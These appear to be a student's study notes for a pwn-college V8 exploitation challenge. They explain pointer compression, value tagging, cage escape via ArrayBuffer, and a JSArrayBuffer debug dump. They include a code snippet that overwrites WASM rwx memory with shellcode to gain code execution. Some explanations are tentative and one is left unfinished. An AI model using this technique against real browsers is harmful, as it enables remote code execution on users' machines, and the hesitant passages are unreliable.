Challenges: 
- pwn-college quarterly quiz

### Setup

Debugging set-up:
Use the `--allow-natives-syntax` flag when debugging d8 (debug build of v8).

This lets you run the following syntax:

```js
%DebugPrint(obj)
%SystemBreak()
```

### Pointer Compression

Reading: https://v8.dev/blog/pointer-compression 

Most of the addresses that we obtain will only be 32 bits long. This is because of something called pointer compression. It's kinda like a value that gets added to a constant offset (I think this is called the memory cage, but it could be something else). Thus, we can only operate within this constant offset unless we have a stronger arb read or write primitive.

With pointer compression, we need a way to differentiate between data and pointers. The solution to this is **value tagging**. Basically, if the LSB of a pointer compressed value is 0, its a constant 31-bit value (ignore the LSB). If it is 1, then it is a pointer. Since almost all pointers are aligned to 8/16 bytes, we read the pointer by xoring 1 to the pointer compressed form.

There's also something called strong pointers and weak pointers, but I lowkey don't know what that is.

```
                        |----- 32 bits -----|
Pointer:                |_____address_____w1|
Smi:                    |___int31_value____0|
```

##### Escaping the Cage

In Javascript `ArrayBuffer`s having a backing store that is in the heap. As such, it is not pointer compressed, and lets us get arb read and write outside of the memory cage. However, this requires having a leak already to read to.

In general, the method to get RCE after getting arb write and read primitives is to overwrite the `rwx` region that stores WASM code. Refer to the [[Template|template exploit script]].

```js
const trusted_data = ArbRead(Number(instance_addr + 8n)) >> 32n;  
const rwx_region = ArbRead(Number(trusted_data) + 48);  
  
console.log(rwx_region.toString(16));  
  
var temp_buf = new ArrayBuffer(shellcode.length)  
var shellcode_writer = new Uint8Array(temp_buf);  
  
ArbWrite(Number(GetAddressOf(shellcode_writer)) + 0x30, Number(BigInt(rwx_region) & BigInt(0xffffff  
ff)), Number(BigInt(rwx_region) >> BigInt(32)));  
  
for(let i = 0; i < shellcode.length; i++){  
   shellcode_writer[i] = shellcode.charCodeAt(i);  
}  
instance.exports.trigger()
```

However, this no longer works on modern hardware, because of the [pkey thing](https://groups.google.com/g/v8-reviews/c/vQyf4P407zc) (I think). Instead, we escape leak libc base by.....
### JS Objects

```
d8> var test = new ArrayBuffer("test");
d8> %DebugPrint(test)  
DebugPrint: 0x1c19000446e9: [JSArrayBuffer]  
- map: 0x1c19001c876d <Map[56](HOLEY_ELEMENTS)> [FastProperties]  
- prototype: 0x1c19001c8901 <Object map = 0x1c19001c8795>  
- elements: 0x1c1900000725 <FixedArray[0]> [HOLEY_ELEMENTS]  
- cpp_heap_wrappable: 0  
- backing_store: (nil)  
- byte_length: 0  
- max_byte_length: 0  
- detach key: 0x1c1900000069 <undefined>  
- detachable  
- properties: 0x1c1900000725 <FixedArray[0]>  
- All own properties (excluding elements): {}  
0x1c19001c876d: [Map] in OldSpace  
- map: 0x1c19001c01b5 <MetaMap (0x1c19001c0205 <NativeContext[295]>)>  
- type: JS_ARRAY_BUFFER_TYPE  
- instance size: 56  
- inobject properties: 0  
- unused property fields: 0  
- elements kind: HOLEY_ELEMENTS  
- enum length: invalid  
- stable_map  
- back pointer: 0x1c1900000069 <undefined>  
- prototype_validity cell: 0x1c1900000a89 <Cell value= 1>  
- instance descriptors (own) #0: 0x1c1900000759 <DescriptorArray[0]>  
- prototype: 0x1c19001c8901 <Object map = 0x1c19001c8795>  
- constructor: 0x1c19001c871d <JSFunction ArrayBuffer (sfi = 0x1c190002f315)>  
- dependent code: 0x1c1900000735 <Other heap object (WEAK_ARRAY_LIST_TYPE)>  
- construction counter: 0
```

How a JS Object's type is defined is through its map. Other stuff, such as variable name and properties, are stored in the props struct. 